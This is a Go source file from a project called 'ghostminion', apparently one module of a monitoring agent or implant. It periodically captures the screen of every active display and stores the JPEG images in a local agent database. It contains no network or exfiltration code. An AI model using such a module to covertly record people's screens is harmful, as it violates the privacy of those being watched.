package apps

import (
	"bytes"
	"context"
	"errors"
	"ghostminion/db"
	"ghostminion/db/dbDataTypes"
	"github.com/kbinani/screenshot"
	"image/jpeg"
	"time"
)

type ScreenShotParams struct {
	Interval int `json:"interval"`
	Quality  int `json:"quality"`
}

type ScreenshotApp struct {
	baseApp        *BaseApp
	params         *ScreenShotParams
	screenshotChan chan bytes.Buffer
}

func NewScreenshotApp(appData AppData) (*ScreenshotApp, error) {
	params := &ScreenShotParams{}
	if err := appData.UnmarshalParams(params); err != nil {
		return nil, err
	}
	app := &ScreenshotApp{
		baseApp: &BaseApp{
			stop:    make(chan struct{}, 1),
			AppData: &appData,
		},
		params:         params,
		screenshotChan: make(chan bytes.Buffer, 10),
	}
	if err := app.validateParams(); err != nil {
		return nil, err
	}
	return app, nil
}

func (app *ScreenshotApp) Name() string {
	return app.baseApp.Name
}

// Start is blocking.
// It runs produce + store loops until ctx is canceled.
// It returns when both loops have exited.
func (app *ScreenshotApp) Start(ctx context.Context) error {
	// launch store
	done := make(chan struct{})
	go func() {
		defer close(done)
		app.store(ctx)
	}()

	// run produce in this goroutine (blocking)
	app.produce(ctx)

	// wait for `store` to finish before returning
	<-done
	return nil
}

// Stop is optional cleanup.
// Context cancel will stop produce/store loops.
// Here we just close the screenshotChan.
func (app *ScreenshotApp) Stop() error {
	close(app.screenshotChan)
	return nil
}

func (app *ScreenshotApp) produce(ctx context.Context) {
	ticker := time.NewTicker(time.Duration(app.params.Interval) * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			screenshotBuf, err := app.getScreenshot()
			if err != nil {
				lgr.Warn("error capturing screenshot: " + err.Error())
				continue
			}
			lgr.Info("Screenshot captured at ", time.Now().Unix())

			select {
			case app.screenshotChan <- screenshotBuf:
			default:
				lgr.Warn("screenshot channel full, dropping frame")
			}
		}
	}
}

func (app *ScreenshotApp) store(ctx context.Context) {
	for {
		select {
		case <-ctx.Done():
			return
		case buf, ok := <-app.screenshotChan:
			if !ok {
				return
			}
			if err := db.GetInstance().WriteData("", dbDataTypes.Screenshots, buf.Bytes()); err != nil {
				lgr.Error("Error writing screenshot to AgentDB: " + err.Error())
			}
		}
	}
}

func (app *ScreenshotApp) validateParams() error {
	if app.params.Interval <= 0 {
		return errors.New("interval must be > 0")
	}
	if app.params.Quality < 1 || app.params.Quality > 100 {
		return errors.New("quality must be between 1 and 100")
	}
	return nil
}

func (app *ScreenshotApp) getScreenshot() (bytes.Buffer, error) {
	var buf bytes.Buffer

	activeDisplaysNum := screenshot.NumActiveDisplays()
	if activeDisplaysNum <= 0 {
		return buf, errors.New("no active displays found")
	}

	for i := 0; i < activeDisplaysNum; i++ {
		bounds := screenshot.GetDisplayBounds(i)
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			continue
		}
		if err = jpeg.Encode(&buf, img, &jpeg.Options{Quality: app.params.Quality}); err == nil {
			return buf, nil
		}
	}
	return bytes.Buffer{}, errors.New("failed to capture screenshot")
}
